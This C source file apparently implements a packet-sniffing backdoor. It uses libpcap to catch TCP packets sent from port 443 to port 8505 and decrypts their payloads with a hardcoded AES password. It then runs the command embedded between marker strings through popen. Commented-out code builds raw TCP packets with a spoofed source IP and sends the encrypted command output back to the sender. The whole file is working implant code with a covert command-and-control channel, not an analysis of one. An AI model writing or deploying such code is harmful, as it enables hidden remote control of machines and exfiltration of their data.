#include "pkt_sniffer.h"

// /* 
//     96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
// */
// struct pseudo_header
// {
//     u_int32_t source_address;
//     u_int32_t dest_address;
//     u_int8_t placeholder;
//     u_int8_t protocol;
//     u_int16_t tcp_length;
// };

// /*
//     Generic checksum calculation function
// */
// unsigned short csum(unsigned short *ptr,int nbytes) 
// {
//     register long sum;
//     unsigned short oddbyte;
//     register short answer;

//     sum=0;
//     while(nbytes>1) {
//         sum+=*ptr++;
//         nbytes-=2;
//     }
//     if(nbytes==1) {
//         oddbyte=0;
//         *((u_char*)&oddbyte)=*(u_char*)ptr;
//         sum+=oddbyte;
//     }

//     sum = (sum>>16)+(sum & 0xffff);
//     sum = sum + (sum>>16);
//     answer=(short)~sum;

//     return(answer);
// }


// void send_response(char * src, char * dst, int sport, int dport, char *output ) {
//     //Create a raw socket
//     int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

//     if(s == -1)
//     {
//         //socket creation failed, may be because of non-root privileges
//         perror("Failed to create socket");
//         exit(1);
//     }
    
//     //Datagram to represent the packet
//     char datagram[4096] , source_ip[32] , *data , *pseudogram;

//     //zero out the packet buffer
//     memset (datagram, 0, 4096);

//     //IP header
//     struct iphdr *iph = (struct iphdr *) datagram;

//     //TCP header
//     struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
//     struct sockaddr_in sin;
//     struct pseudo_header psh;
    
//     // Encrypting
//     EVP_CIPHER_CTX *en, *de;

//     en = EVP_CIPHER_CTX_new();
//     de = EVP_CIPHER_CTX_new();
    
//     unsigned int salt[] = {12345, 54321};
    
//     /* gen key and iv. init the cipher ctx object */
//     if (aes_init(PASSWORD, strlen(PASSWORD), (unsigned char *)&salt, en, de)) {
//         printf("Couldn't initialize AES cipher\n");
//         exit(1);
//     }

//     int len = strlen(output) + 1;
//     char* encrypted = (unsigned char *) aes_encrypt(en, output, &len);
//     //Data part
//     data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
//     strcpy(data , encrypted);

//     //some address resolution
//     strcpy(source_ip , src);
//     sin.sin_family = AF_INET;
//     sin.sin_port = htons(80);
//     sin.sin_addr.s_addr = inet_addr (dst);

//     //Fill in the IP Header
//     iph->ihl = 5;
//     iph->version = 4;
//     iph->tos = 0;
//     iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
//     iph->id = htonl (54321);	//Id of this packet
//     iph->frag_off = 0;
//     iph->ttl = 255;
//     iph->protocol = IPPROTO_TCP;
//     iph->check = 0;		//Set to 0 before calculating checksum
//     iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
//     iph->daddr = sin.sin_addr.s_addr;

//     //Ip checksum
//     iph->check = csum ((unsigned short *) datagram, iph->tot_len);

//     //TCP Header
//     tcph->source = htons (sport);
//     tcph->dest = htons (dport);
//     tcph->seq = 0;
//     tcph->ack_seq = 0;
//     tcph->doff = 5;	//tcp header size
//     tcph->fin=0;
//     tcph->syn=1;
//     tcph->rst=0;
//     tcph->psh=0;
//     tcph->ack=0;
//     tcph->urg=0;
//     tcph->window = htons (5840);	/* maximum allowed window size */
//     tcph->check = 0;	//leave checksum 0 now, filled later by pseudo header
//     tcph->urg_ptr = 0;

//     //Now the TCP checksum
//     psh.source_address = inet_addr( source_ip );
//     psh.dest_address = sin.sin_addr.s_addr;
//     psh.placeholder = 0;
//     psh.protocol = IPPROTO_TCP;
//     psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );

//     int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
//     pseudogram = malloc(psize);

//     memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
//     memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));

//     tcph->check = csum( (unsigned short*) pseudogram , psize);

//     //IP_HDRINCL to tell the kernel that headers are included in the packet
//     int one = 1;
//     const int *val = &one;

//     if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
//     {
//         perror("Error setting IP_HDRINCL");
//         exit(0);
//     }

//     //Send the packet
//     if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
//     {
//         perror("sendto failed");
//     }
//     //Data send successfully
//     else
//     {
//         printf ("Packet Send. Length : %d \n" , iph->tot_len);
//     }
// }

// Check all the headers in the Ethernet frame
void pkt_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    u_int16_t type = handle_ethernet(args,pkthdr,packet);

    if(type == ETHERTYPE_IP) // handle the IP packet
    {
        handle_IP(args,pkthdr,packet);
    }
    else if (type == ETHERTYPE_ARP) // handle the ARP packet 
    {
    }
    else if (type == ETHERTYPE_REVARP) // handle reverse arp packet 
    {
    }
}


// This function will parse the IP header and print out selected fields of interest
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
    	const struct my_ip* ip;
    	u_int length = pkthdr->len;
    	u_int hlen,off,version;
    	int len;
        char src_ip[14];
	
    	// Jump past the Ethernet header 
    	ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    	length -= sizeof(struct ether_header); 

    	// make sure that the packet is of a valid length 
    	if (length < sizeof(struct my_ip))
    	{
        	//printf ("Truncated IP %d",length);
        	exit (1);
    	}

    	len     = ntohs(ip->ip_len);
    	hlen    = IP_HL(ip); 	// get header length 
    	version = IP_V(ip);	// get the IP version number

    	// verify version 
    	if(version != 4)
    	{
      		//fprintf(stdout,"Unknown version %d\n",version);
      		exit (1); 
        }

    	// verify the header length */
    	if(hlen < 5 )
    	{
        	//fprintf(stdout,"Bad header length %d \n",hlen);
    	}

    	// Ensure that we have as much of the packet as we should 
    	if (length < len)
        	//printf("\nTruncated IP - %d bytes missing\n",len - length);

    	// Ensure that the first fragment is present
    	off = ntohs(ip->ip_off);
    	if ((off & 0x1fff) == 0 ) 	// i.e, no 1's in first 13 bits 
        {   // print SOURCE DESTINATION hlen version len offset */
//         	fprintf(stdout,"IP: ");
//         	fprintf(stdout,"%s ", inet_ntoa(ip->ip_src));
//         	fprintf(stdout,"%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen,version,len,off);
    	}
    	
    	switch (ip->ip_p) 
        {
            case IPPROTO_TCP:
                //printf("   Protocol: TCP\n");
                memset(src_ip, 0x0, sizeof(src_ip));
                strncpy(src_ip, inet_ntoa(ip->ip_src), sizeof(src_ip));
                handle_TCP (args, pkthdr, packet, src_ip);
                break;
            case IPPROTO_UDP:
                //printf("   Protocol: UDP\n");
                break;
            case IPPROTO_ICMP:
                //printf("   Protocol: ICMP\n");
                break;
            case IPPROTO_IP:
                //printf("   Protocol: IP\n");
                break;
            default:
                //printf("   Protocol: unknown\n");
                break;
        }
}

// This function will parse the IP header and print out selected fields of interest
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, char * src)
{
    const struct sniff_tcp *tcp=0;          // The TCP header 
    const struct my_ip *ip;              	// The IP header 
    const char *payload;                  // Packet payload 

    int size_ip;
    int size_tcp;
    int size_payload;

    char *ptr, *ptr2, *decrypted;
    char command[MAX_SIZE], argv[MAX_SIZE];

// 	printf ("\n");
// 	printf ("TCP packet\n");

    ip = (struct my_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL (ip)*4;
    
    // define/compute tcp header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    
    if (size_tcp < 20) 
    {
            printf("   * Control Packet? length: %u bytes\n", size_tcp);
            exit(1);
    }
    
    // Delete this line
    if (ntohs(tcp->th_sport) == 443 && ntohs(tcp->th_dport) == 8505) {
        printf ("   Src port: %d\n", ntohs(tcp->th_sport));
        printf ("   Dst port: %d\n", ntohs(tcp->th_dport));
        
        // define/compute tcp payload (segment) offset
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
        decrypted = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
        //decrypted = (char *) malloc(strlen(payload) * sizeof(char));
        // compute tcp payload (segment) size
        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
        
        
        // Print payload data, including binary translation 
        
        //if (size_payload > 0) 
        if (size_payload > 0)
        {
            printf("   Payload (%d bytes):\n", size_payload);
            print_payload (payload, size_payload);

            printf("Encrypted(%d): %s\n", strlen(payload), payload);
            
            // Decrypting
            EVP_CIPHER_CTX *en, *de;
  
            en = EVP_CIPHER_CTX_new();
            de = EVP_CIPHER_CTX_new();
            
            unsigned int salt[] = {12345, 54321};
            
            
            /* gen key and iv. init the cipher ctx object */
            if (aes_init(PASSWORD, strlen(PASSWORD), (unsigned char *)&salt, en, de)) {
                printf("Couldn't initialize AES cipher\n");
                exit(1);
            }
            
            int len = strlen(payload) + 1;
            decrypted = aes_decrypt(de, (unsigned char *)payload, &len);
            printf("Decrypted: %s\n", decrypted);

            if (!(ptr = strstr(decrypted, COMMAND_START))) 
                return;
            ptr += strlen(COMMAND_START);
            if (!(ptr2 = strstr(ptr, COMMAND_END)))
                return;
            
            memset(command, 0x0, sizeof(command));
            strncpy(command, ptr, (ptr2 - ptr));

            FILE *fp;
            char path[1035];

            fp = popen(command, "r");
            
            printf("SRC: %s\n", inet_ntoa(ip->ip_src));
            if (fp == NULL) {
                printf("Failed to run command\n");
                exit(1);
            }
            
            while (fgets(path, sizeof(path), fp) != NULL) {
                //printf("%s", path);
                send_response(inet_ntoa(ip->ip_dst), src, ntohs(tcp->th_dport), ntohs(tcp->th_sport), path);
            }

            printf("%s sending ...\n", END_OF_TRANSMIT);
            // Send EOT to indicate the end of transmit
            send_response(inet_ntoa(ip->ip_dst), src, ntohs(tcp->th_dport), ntohs(tcp->th_sport), END_OF_TRANSMIT);
            
            pclose(fp);
        }
    }
}


